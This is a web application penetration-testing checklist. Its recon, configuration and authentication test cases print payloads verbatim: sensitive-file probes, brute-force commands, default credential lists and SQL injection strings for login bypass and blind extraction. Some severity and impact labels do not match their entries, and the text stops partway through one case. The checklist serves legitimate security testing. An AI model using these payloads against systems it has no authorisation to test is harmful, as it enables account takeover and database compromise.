# Black-Box Web App Checklist — Checklist

Feature-area security **test cases** for “Black-Box Web App Checklist”. Functionality-driven checklist mapped to the per-attack kits; impact-first with severity + CVSS.

*136 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## INFO-004 — Backup and Old File Discovery
**Test Category:** Information Gathering · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** External attack surface (files/dirs/params)

**Test Steps:** 1. Check for common backup files: login.bak login.php.bak login.old login.php~ login.php.swp .login.php.swp<br>2. Check for archive files: backup.zip backup.tar.gz site.zip www.zip<br>3. Test for version control: /.git/HEAD /.svn/entries /.hg/<br>4. Check for database dumps: dump.sql backup.sql db.sql<br>5. Check for config backups: web.config.bak .env .env.bak config.php.bak

**Expected Result:** No backup files source code archives or version control directories should be publicly accessible

**Payload Example:**

```
GET /login.php.bak HTTP/1.1
GET /.git/HEAD HTTP/1.1
GET /.env HTTP/1.1
GET /backup.zip HTTP/1.1
GET /web.config.old HTTP/1.1
```

**Impact:** Attack-surface &amp; sensitive-file discovery expanding exploitable footprint

**Tools:** Gobuster / Dirsearch / Burp Suite / ffuf

**References:** CWE-200; -&gt;[Recon checklist](#/checklist/recon); Jason Haddix BHM; ProjectDiscovery; OWASP Amass

---

## INFO-003 — Directory Bruteforce Enumeration
**Test Category:** Information Gathering · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Login endpoint — no rate limit / lockout

**Test Steps:** 1. Run directory bruteforce tool against target URL<br>2. Use common wordlists (dirbuster medium/large or SecLists)<br>3. Test with extensions: .php .asp .aspx .jsp .html .js .json .xml .bak .old .txt .config .env .yml .log<br>4. Note all 200/301/302/403 responses<br>5. Investigate each discovered path

**Expected Result:** No sensitive directories admin panels backup files or configuration files should be publicly accessible

**Payload Example:**

```
dirb http://target.com /usr/share/wordlists/dirb/common.txt
OR
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,asp,aspx,html,txt,bak,old
```

**Impact:** Credential brute-force / stuffing -&gt; account takeover

**Tools:** Gobuster / Dirb / Dirsearch / ffuf / Feroxbuster

**References:** CWE-307; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; OWASP WSTG-ATHN

---

## INFO-009 — JavaScript File Analysis
**Test Category:** Information Gathering · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Client JavaScript / source maps

**Test Steps:** 1. Identify all JavaScript files loaded by the login page<br>2. Download and analyze each JS file<br>3. Search for API endpoints URLs and paths<br>4. Search for hardcoded credentials tokens or API keys<br>5. Search for comments with sensitive info<br>6. Look for hidden admin functionality or debug functions<br>7. Check for source maps (.js.map files)

**Expected Result:** JavaScript files should not contain hardcoded secrets API keys credentials hidden endpoints or sensitive business logic

**Payload Example:**

```
Search patterns in JS:
api_key password secret token admin
/api/ /v1/ /internal/ /admin/
authorization bearer apikey
```

**Impact:** Hidden endpoints, params &amp; secrets exposed in client JS

**Tools:** LinkFinder / JSParser / Burp Suite / Browser DevTools / SecretFinder

**References:** CWE-200; -&gt;[JavaScript Files checklist](#/checklist/jsfiles); Tomnomnom jsluice; Assetnote; trufflehog

---

## INFO-011 — Admin Panel Discovery
**Test Category:** Information Gathering · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** External attack surface (files/dirs/params)

**Test Steps:** 1. Test common admin paths: /admin /administrator /admin.php /wp-admin /cpanel /manager /dashboard /console /admin/login<br>2. Test CMS-specific admin panels<br>3. Test common management interfaces: /phpmyadmin /adminer /webmail<br>4. Check for admin subpaths from discovered directories<br>5. Try appending /admin to discovered directories

**Expected Result:** Admin panels should not be publicly accessible or should require strong authentication and IP whitelisting

**Payload Example:**

```
GET /admin HTTP/1.1
GET /administrator HTTP/1.1
GET /admin/login HTTP/1.1
GET /dashboard HTTP/1.1
GET /console HTTP/1.1
GET /phpmyadmin HTTP/1.1
```

**Impact:** Attack-surface &amp; sensitive-file discovery expanding exploitable footprint

**Tools:** Gobuster / Dirb / Dirsearch / ffuf

**References:** CWE-200; -&gt;[Recon checklist](#/checklist/recon); Jason Haddix BHM; ProjectDiscovery; OWASP Amass

---

## INFO-012 — CORS Misconfiguration Testing
**Test Category:** Information Gathering · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Origin header / CORS preflight

**Test Steps:** 1. Send request with Origin header set to attacker domain<br>2. Send request with Origin header set to null<br>3. Send request with Origin header as subdomain variation<br>4. Check if Access-Control-Allow-Origin reflects arbitrary origin<br>5. Check if Access-Control-Allow-Credentials is true with reflected origin

**Expected Result:** CORS policy should not reflect arbitrary origins. Access-Control-Allow-Credentials should not be true with wildcard or reflected origin

**Payload Example:**

```
GET /login HTTP/1.1
Host: target.com
Origin: https://evil.com

GET /login HTTP/1.1
Host: target.com
Origin: null
```

**Impact:** Permissive CORS -&gt; cross-origin theft of authenticated data

**Tools:** Burp Suite / curl / CORScanner

**References:** CWE-942; -&gt;[CORS checklist](#/checklist/cors); PortSwigger CORS; s0md3v/Corsy

---

## INFO-007 — HTTP Methods Testing
**Test Category:** Information Gathering · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** External attack surface (files/dirs/params)

**Test Steps:** 1. Send OPTIONS request to login page<br>2. Test PUT DELETE TRACE CONNECT PATCH methods<br>3. Check if TRACE method is enabled (XST attack)<br>4. Test if PUT allows file upload<br>5. Check response for each method

**Expected Result:** Only GET and POST methods should be allowed on the login page. TRACE PUT DELETE should return 405 Method Not Allowed

**Payload Example:**

```
OPTIONS /login HTTP/1.1
Host: target.com

TRACE /login HTTP/1.1
Host: target.com

PUT /login HTTP/1.1
Host: target.com
```

**Impact:** Attack-surface &amp; sensitive-file discovery expanding exploitable footprint

**Tools:** curl / Burp Suite / Nmap http-methods script

**References:** CWE-200; -&gt;[Recon checklist](#/checklist/recon); Jason Haddix BHM; ProjectDiscovery; OWASP Amass

---

## INFO-008 — Source Code Comment Analysis
**Test Category:** Information Gathering · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** External attack surface (files/dirs/params)

**Test Steps:** 1. View page source of login page (Ctrl+U)<br>2. Search for HTML comments (&lt;!-- --&gt;)<br>3. Search for JavaScript comments (// and /* */)<br>4. Look for TODO FIXME DEBUG HACK PASSWORD USERNAME notes<br>5. Check all linked JS files for comments and sensitive information<br>6. Look for hardcoded credentials API keys or internal URLs

**Expected Result:** Page source should not contain sensitive comments including credentials internal paths debug information or developer notes

**Payload Example:**

```
<!-- TODO: Remove before production -->
<!-- Admin: admin/admin123 -->
<!-- Debug mode: set debug=true -->
// API Key: sk-xxxx
```

**Impact:** Attack-surface &amp; sensitive-file discovery expanding exploitable footprint

**Tools:** Browser View Source / Burp Suite / grep

**References:** CWE-200; -&gt;[Recon checklist](#/checklist/recon); Jason Haddix BHM; ProjectDiscovery; OWASP Amass

---

## INFO-013 — Security Headers Check
**Test Category:** Information Gathering · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Security response headers (CSP/HSTS/XFO)

**Test Steps:** 1. Check for X-Frame-Options header (DENY or SAMEORIGIN)<br>2. Check for Content-Security-Policy header<br>3. Check for X-Content-Type-Options (nosniff)<br>4. Check for X-XSS-Protection header<br>5. Check for Strict-Transport-Security (HSTS)<br>6. Check for Referrer-Policy header<br>7. Check for Permissions-Policy header<br>8. Check for Cache-Control headers for sensitive pages

**Expected Result:** All security headers should be properly configured. Login page should have X-Frame-Options CSP HSTS X-Content-Type-Options and proper Cache-Control

**Payload Example:**

```
curl -I https://target.com/login
Check for presence and correct values of:
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000
```

**Impact:** Missing hardening headers weakens defense-in-depth

**Tools:** SecurityHeaders.com / curl / Burp Suite / Nmap

**References:** CWE-693; -&gt;[CORS checklist](#/checklist/cors); OWASP Secure Headers Project; securityheaders.com

---

## INFO-014 — SSL/TLS Configuration Analysis
**Test Category:** Information Gathering · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** TLS config / at-rest &amp; in-transit crypto

**Test Steps:** 1. Check SSL/TLS certificate validity and expiration<br>2. Test for supported TLS versions (TLS 1.0 1.1 should be disabled)<br>3. Check for weak cipher suites<br>4. Test for SSL vulnerabilities: POODLE BEAST CRIME BREACH Heartbleed<br>5. Check for HSTS header and preload<br>6. Verify certificate chain<br>7. Check for certificate transparency

**Expected Result:** Only TLS 1.2 and TLS 1.3 should be supported. No weak ciphers. Valid certificate chain. HSTS enabled

**Payload Example:**

```
testssl.sh https://target.com
OR
nmap --script ssl-enum-ciphers -p 443 target.com
OR
sslyze target.com
```

**Impact:** Weak crypto/TLS exposes data in transit or at rest

**Tools:** testssl.sh / SSLyze / Nmap / SSLLabs

**References:** CWE-327; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-CRYP; testssl.sh

---

## INFO-001 — Robots.txt Discovery
**Test Category:** Information Gathering · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** External attack surface (files/dirs/params)

**Test Steps:** 1. Navigate to /robots.txt on target URL<br>2. Analyze Disallow and Allow entries<br>3. Note any hidden paths or admin directories<br>4. Visit each discovered path manually

**Expected Result:** robots.txt should not expose sensitive directories or admin panels or internal paths

**Payload Example:**

```
GET /robots.txt HTTP/1.1
Host: target.com
```

**Impact:** Attack-surface &amp; sensitive-file discovery expanding exploitable footprint

**Tools:** curl / Burp Suite / Browser

**References:** CWE-200; -&gt;[Recon checklist](#/checklist/recon); Jason Haddix BHM; ProjectDiscovery; OWASP Amass

---

## INFO-002 — Sitemap.xml Discovery
**Test Category:** Information Gathering · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** External attack surface (files/dirs/params)

**Test Steps:** 1. Navigate to /sitemap.xml on target URL<br>2. Check for /sitemap_index.xml as well<br>3. Analyze all listed URLs<br>4. Look for hidden or unlinked pages

**Expected Result:** sitemap.xml should not reveal sensitive or internal endpoints

**Payload Example:**

```
GET /sitemap.xml HTTP/1.1
Host: target.com
```

**Impact:** Attack-surface &amp; sensitive-file discovery expanding exploitable footprint

**Tools:** curl / Burp Suite / Browser

**References:** CWE-200; -&gt;[Recon checklist](#/checklist/recon); Jason Haddix BHM; ProjectDiscovery; OWASP Amass

---

## INFO-005 — Technology Fingerprinting
**Test Category:** Information Gathering · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** External attack surface (files/dirs/params)

**Test Steps:** 1. Analyze HTTP response headers (Server X-Powered-By X-AspNet-Version)<br>2. Check page source for framework-specific meta tags or comments<br>3. Analyze cookie names for framework identification (e.g. PHPSESSID JSESSIONID ASP.NET_SessionId)<br>4. Check for default error pages<br>5. Use Wappalyzer or WhatWeb to identify stack<br>6. Check for common framework-specific paths (/wp-admin /administrator etc.)

**Expected Result:** Server should not reveal detailed version information of web server framework or technology stack

**Payload Example:**

```
HTTP/1.1 200 OK
Server: Apache/2.4.49
X-Powered-By: PHP/7.4.3
```

**Impact:** Attack-surface &amp; sensitive-file discovery expanding exploitable footprint

**Tools:** Wappalyzer / WhatWeb / Burp Suite / Nmap

**References:** CWE-200; -&gt;[Recon checklist](#/checklist/recon); Jason Haddix BHM; ProjectDiscovery; OWASP Amass

---

## INFO-006 — HTTP Response Header Analysis
**Test Category:** Information Gathering · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** External attack surface (files/dirs/params)

**Test Steps:** 1. Send a GET request to the login page<br>2. Analyze all response headers<br>3. Check for information leaking headers: Server X-Powered-By X-AspNet-Version X-Debug<br>4. Check for internal IP addresses in headers<br>5. Check Via and X-Forwarded-For headers for internal infrastructure info

**Expected Result:** Response headers should not leak sensitive information about server software versions internal IPs or debug information

**Payload Example:**

```
curl -I https://target.com/login
Look for: Server: nginx/1.19.0 or X-Powered-By: Express
```

**Impact:** Attack-surface &amp; sensitive-file discovery expanding exploitable footprint

**Tools:** curl / Burp Suite / Nmap

**References:** CWE-200; -&gt;[Recon checklist](#/checklist/recon); Jason Haddix BHM; ProjectDiscovery; OWASP Amass

---

## INFO-010 — Error Page Information Disclosure
**Test Category:** Information Gathering · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Error responses / verbose output / headers

**Test Steps:** 1. Trigger 404 error by requesting non-existent page<br>2. Trigger 500 error by sending malformed requests<br>3. Trigger 400 error with malformed parameters<br>4. Analyze error page content for technology disclosure<br>5. Check if custom error pages are implemented<br>6. Look for stack traces file paths or version information

**Expected Result:** Error pages should be custom and should not reveal server technology stack traces file paths database information or internal details

**Payload Example:**

```
GET /nonexistent_page_xyz HTTP/1.1
GET /login?id=<invalid> HTTP/1.1
GET /login%00 HTTP/1.1
```

**Impact:** Stack traces/paths/PII leaked, aiding further exploitation

**Tools:** Burp Suite / curl / Browser

**References:** CWE-209; -&gt;[Recon checklist](#/checklist/recon); OWASP WSTG-ERRH; PortSwigger information disclosure

---

## CONFIG-002 — Sensitive File Exposure
**Test Category:** Configuration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. Check for .env files containing environment variables<br>2. Check for .git directory exposure<br>3. Check for configuration files: config.php wp-config.php web.config<br>4. Check for log files: error.log access.log debug.log<br>5. Check for database files: .sql .sqlite .db<br>6. Check for IDE files: .idea/ .vscode/ .project

**Expected Result:** No sensitive configuration database or version control files should be publicly accessible

**Payload Example:**

```
GET /.env HTTP/1.1
GET /.git/config HTTP/1.1
GET /config.php HTTP/1.1
GET /wp-config.php.bak HTTP/1.1
GET /web.config HTTP/1.1
GET /error.log HTTP/1.1
GET /debug.log HTTP/1.1
GET /database.sql HTTP/1.1
GET /.DS_Store HTTP/1.1
GET /Thumbs.db HTTP/1.1
```

**Impact:** Misconfiguration exposes data or weakens controls

**Tools:** Gobuster / Dirsearch / Burp Suite / ffuf

**References:** CWE-16; -&gt;[CORS checklist](#/checklist/cors); OWASP WSTG-CONF; PortSwigger

---

## CONFIG-009 — Default Credentials in Third-Party Components
**Test Category:** Configuration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login endpoint — no rate limit / lockout

**Test Steps:** 1. Identify third-party components (Tomcat Jenkins etc.)<br>2. Test default credentials for those components<br>3. Check for exposed admin interfaces<br>4. Test component-specific vulnerabilities

**Expected Result:** Third-party components should not have default credentials

**Payload Example:**

```
Tomcat: admin/admin
Jenkins: admin/admin
phpMyAdmin: root/ (blank)
```

**Impact:** Credential brute-force / stuffing -&gt; account takeover

**Tools:** Burp Suite / Default Cred Lists

**References:** CWE-307; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; OWASP WSTG-ATHN

---

## CONFIG-011 — Database Connection String Exposure
**Test Category:** Configuration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. Check for database connection strings in responses<br>2. Test error messages for DB details<br>3. Check config files exposure<br>4. Test for connection string injection

**Expected Result:** Database credentials should not be exposed

**Payload Example:**

```
Error: SQLSTATE[28000] [1045] Access denied for user 'dbuser'@'localhost' (using password: YES)
```

**Impact:** Misconfiguration exposes data or weakens controls

**Tools:** Burp Suite

**References:** CWE-16; -&gt;[CORS checklist](#/checklist/cors); OWASP WSTG-CONF; PortSwigger

---

## CONFIG-003 — Debug Mode Enabled
**Test Category:** Configuration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Error responses / verbose output / headers

**Test Steps:** 1. Check for debug information in responses<br>2. Test debug parameters: ?debug=true ?debug=1 ?test=true<br>3. Look for debug headers in responses: X-Debug X-Debug-Token<br>4. Check for framework debug pages (Django debug Symfony profiler)<br>5. Test for verbose error messages indicating debug mode

**Expected Result:** Debug mode should be disabled in production. No debug information should be exposed

**Payload Example:**

```
GET /login?debug=true HTTP/1.1
GET /login?debug=1 HTTP/1.1
GET /login?test=true HTTP/1.1
GET /login?XDEBUG_SESSION_START=1 HTTP/1.1
GET /_debugbar HTTP/1.1
GET /_profiler HTTP/1.1
GET /elmah.axd HTTP/1.1
GET /trace.axd HTTP/1.1
```

**Impact:** Stack traces/paths/PII leaked, aiding further exploitation

**Tools:** Burp Suite / Browser / Dirsearch

**References:** CWE-209; -&gt;[Recon checklist](#/checklist/recon); OWASP WSTG-ERRH; PortSwigger information disclosure

---

## CONFIG-004 — HTTP to HTTPS Redirect Check
**Test Category:** Configuration · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** redirect/return/next/url parameter

**Test Steps:** 1. Access login page via HTTP<br>2. Check if automatic redirect to HTTPS occurs<br>3. Check redirect type (301 permanent vs 302 temporary)<br>4. Test for HSTS header presence<br>5. Check if HSTS preload is configured<br>6. Test for SSL stripping vulnerability

**Expected Result:** HTTP should redirect to HTTPS with 301 status. HSTS header should be present with adequate max-age

**Payload Example:**

```
curl -v http://target.com/login
Check for: 301 redirect to https://
Check for: Strict-Transport-Security header

HSTS should be:
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**Impact:** Redirect abuse -&gt; phishing / OAuth token theft

**Tools:** curl / SSLStrip / Burp Suite

**References:** CWE-601; -&gt;[Open Redirect checklist](#/checklist/openredir); PortSwigger; disclosed OAuth-redirect writeups

---

## CONFIG-001 — Directory Listing Enabled
**Test Category:** Configuration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. Navigate to common directories found during enumeration<br>2. Check if directory contents are listed<br>3. Test parent directories<br>4. Look for sensitive files in listed directories<br>5. Check /images/ /css/ /js/ /uploads/ /includes/ /backup/

**Expected Result:** Directory listing should be disabled on all directories. Server should return 403 or custom page instead of file listing

**Payload Example:**

```
GET /images/ HTTP/1.1
GET /css/ HTTP/1.1
GET /js/ HTTP/1.1
GET /uploads/ HTTP/1.1
GET /includes/ HTTP/1.1
GET /backup/ HTTP/1.1
GET /temp/ HTTP/1.1
GET /logs/ HTTP/1.1
```

**Impact:** Misconfiguration exposes data or weakens controls

**Tools:** Browser / Burp Suite / Dirsearch

**References:** CWE-16; -&gt;[CORS checklist](#/checklist/cors); OWASP WSTG-CONF; PortSwigger

---

## CONFIG-006 — Unrestricted HTTP Methods on Directories
**Test Category:** Configuration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. Test OPTIONS TRACE PUT DELETE on discovered directories<br>2. Check if WebDAV is enabled<br>3. Test if file upload is possible via PUT method<br>4. Test TRACE method for XST (Cross-Site Tracing)<br>5. Test PROPFIND MOVE COPY methods

**Expected Result:** Only necessary HTTP methods should be allowed. TRACE PUT DELETE WebDAV methods should be disabled

**Payload Example:**

```
OPTIONS /discovered-dir/ HTTP/1.1
TRACE /discovered-dir/ HTTP/1.1
PUT /discovered-dir/test.html HTTP/1.1
DELETE /discovered-dir/ HTTP/1.1
PROPFIND /discovered-dir/ HTTP/1.1
```

**Impact:** Misconfiguration exposes data or weakens controls

**Tools:** curl / Nmap / Burp Suite

**References:** CWE-16; -&gt;[CORS checklist](#/checklist/cors); OWASP WSTG-CONF; PortSwigger

---

## CONFIG-007 — Cache Control for Login Page
**Test Category:** Configuration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. Check Cache-Control header on login page<br>2. Check Pragma header<br>3. Check Expires header<br>4. Test if login page is cached by proxy/CDN<br>5. Verify credentials are not cached in browser

**Expected Result:** Login page should have Cache-Control: no-store no-cache. Credentials and authenticated responses should never be cached

**Payload Example:**

```
Expected headers:
Cache-Control: no-store, no-cache, must-revalidate, max-age=0
Pragma: no-cache
Expires: 0

VULNERABLE:
Cache-Control: public, max-age=3600
```

**Impact:** Misconfiguration exposes data or weakens controls

**Tools:** curl / Burp Suite / Browser DevTools

**References:** CWE-16; -&gt;[CORS checklist](#/checklist/cors); OWASP WSTG-CONF; PortSwigger

---

## CONFIG-010 — Security Headers for API Endpoints
**Test Category:** Configuration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Security response headers (CSP/HSTS/XFO)

**Test Steps:** 1. Check if login has API endpoints<br>2. Test security headers on API responses<br>3. Check for API versioning security<br>4. Test API rate limiting

**Expected Result:** API endpoints should have proper security headers

**Payload Example:**

```
Check for:
X-API-Key validation
Rate limiting headers
API version in URL/path
```

**Impact:** Missing hardening headers weakens defense-in-depth

**Tools:** Burp Suite / Postman

**References:** CWE-693; -&gt;[CORS checklist](#/checklist/cors); OWASP Secure Headers Project; securityheaders.com

---

## CONFIG-005 — Server Banner Disclosure
**Test Category:** Configuration · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. Check Server header in HTTP response<br>2. Check X-Powered-By header<br>3. Check X-AspNet-Version header<br>4. Check other technology-revealing headers<br>5. Try triggering error pages for additional version info

**Expected Result:** Server should not reveal specific software versions in response headers

**Payload Example:**

```
VULNERABLE:
Server: Apache/2.4.49
X-Powered-By: PHP/7.4.3
X-AspNet-Version: 4.0.30319

SECURE:
Server: (removed or generic)
No X-Powered-By header
```

**Impact:** Misconfiguration exposes data or weakens controls

**Tools:** curl / Nmap / Burp Suite

**References:** CWE-16; -&gt;[CORS checklist](#/checklist/cors); OWASP WSTG-CONF; PortSwigger

---

## CONFIG-008 — Content-Type Header Validation
**Test Category:** Configuration · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. Change Content-Type of login request to different types<br>2. Test: application/json text/xml multipart/form-data<br>3. Check if server accepts unexpected content types<br>4. Test if changing content type reveals different behavior or errors<br>5. Check for content type mismatch vulnerabilities

**Expected Result:** Server should validate Content-Type and reject unexpected content types

**Payload Example:**

```
Original: Content-Type: application/x-www-form-urlencoded

Test with:
Content-Type: application/json
{"username":"admin","password":"test"}

Content-Type: application/xml
<login><username>admin</username></login>

Content-Type: text/plain
```

**Impact:** Misconfiguration exposes data or weakens controls

**Tools:** Burp Suite / curl

**References:** CWE-16; -&gt;[CORS checklist](#/checklist/cors); OWASP WSTG-CONF; PortSwigger

---

## AUTH-001 — Default Credentials Testing
**Test Category:** Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login endpoint — no rate limit / lockout

**Test Steps:** 1. Identify the technology/framework used<br>2. Test common default credential pairs:<br>   admin:admin admin:password admin:123456 administrator:administrator root:root root:toor test:test guest:guest<br>3. Test vendor-specific default credentials<br>4. Test with blank passwords<br>5. Document all attempts and responses

**Expected Result:** Login should not accept any default or common credential pairs

**Payload Example:**

```
admin:admin
admin:password
admin:123456
admin:admin123
administrator:administrator
root:root
root:toor
test:test
user:user
guest:guest
```

**Impact:** Credential brute-force / stuffing -&gt; account takeover

**Tools:** Burp Suite Intruder / Hydra / Custom Script

**References:** CWE-307; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; OWASP WSTG-ATHN

---

## AUTH-004 — Brute Force Attack on Login
**Test Category:** Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login endpoint — no rate limit / lockout

**Test Steps:** 1. Prepare username list (admin root administrator user test)<br>2. Prepare password list (rockyou top 1000 common passwords)<br>3. Configure brute force tool with target login form<br>4. Identify login request parameters and failure indicators<br>5. Run brute force attack<br>6. Monitor for account lockout or rate limiting<br>7. Check if CAPTCHA appears after failed attempts

**Expected Result:** Account lockout or rate limiting should trigger after 3-5 failed attempts. CAPTCHA should appear. IP-based blocking should activate

**Payload Example:**

```
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=?payload?

Use wordlist: /usr/share/seclists/Passwords/Common-Credentials/top-1000.txt
```

**Impact:** Credential brute-force / stuffing -&gt; account takeover

**Tools:** Hydra / Burp Suite Intruder / Medusa / ffuf / Patator

**References:** CWE-307; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; OWASP WSTG-ATHN

---

## AUTH-007 — SQL Injection - Authentication Bypass
**Test Category:** Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Params / body / query reaching a SQL query

**Test Steps:** 1. Enter SQL injection payloads in username field<br>2. Enter SQL injection payloads in password field<br>3. Test with single quotes double quotes<br>4. Test boolean-based payloads<br>5. Test UNION-based payloads<br>6. Test time-based blind payloads<br>7. Test with different SQL database syntaxes (MySQL MSSQL Oracle PostgreSQL)<br>8. Test with URL encoding and double encoding<br>9. Test with comment variations

**Expected Result:** Login should not be bypassed via SQL injection. Application should use parameterized queries. Input should be properly sanitized

**Payload Example:**

```
Username field:
' OR '1'='1' --
' OR '1'='1' #
' OR 1=1 --
admin' --
admin' #
' OR 'x'='x
' OR 1=1 LIMIT 1 --
') OR ('1'='1
' UNION SELECT 1,2,3 --

Password field:
' OR '1'='1
anything' OR '1'='1' --
```

**Impact:** SQL injection -&gt; authN bypass, DB read/modify, potential RCE

**Tools:** SQLMap / Burp Suite / Manual Testing

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## AUTH-008 — SQL Injection - Blind Boolean Based
**Test Category:** Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Params / body / query reaching a SQL query

**Test Steps:** 1. Test boolean conditions in username/password fields<br>2. Compare responses for true vs false conditions<br>3. Test: admin' AND '1'='1 vs admin' AND '1'='2<br>4. Monitor response length status code and content differences<br>5. If difference found use boolean extraction technique

**Expected Result:** Application should not exhibit different behavior based on boolean SQL conditions

**Payload Example:**

```
admin' AND '1'='1' --  (true condition)
admin' AND '1'='2' --  (false condition)
admin' AND SUBSTRING(@@version,1,1)='5' --
admin' AND (SELECT COUNT(*) FROM users)>0 --
```

**Impact:** SQL injection -&gt; authN bypass, DB read/modify, potential RCE

**Tools:** SQLMap / Burp Suite / Custom Script

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## AUTH-009 — SQL Injection - Time Based Blind
**Test Category:** Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Params / body / query reaching a SQL query

**Test Steps:** 1. Inject time delay payloads in username field<br>2. Inject time delay payloads in password field<br>3. Measure response time for each payload<br>4. Compare with baseline response time<br>5. Test for MySQL MSSQL PostgreSQL Oracle syntax

**Expected Result:** Application should not exhibit time delays based on injected SQL timing functions

**Payload Example:**

```
admin' AND SLEEP(5) -- (MySQL)
admin'; WAITFOR DELAY '0:0:5' -- (MSSQL)
admin' AND pg_sleep(5) -- (PostgreSQL)
admin' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5) -- (Oracle)
admin'||(SELECT SLEEP(5)) --
```

**Impact:** SQL injection -&gt; authN bypass, DB read/modify, potential RCE

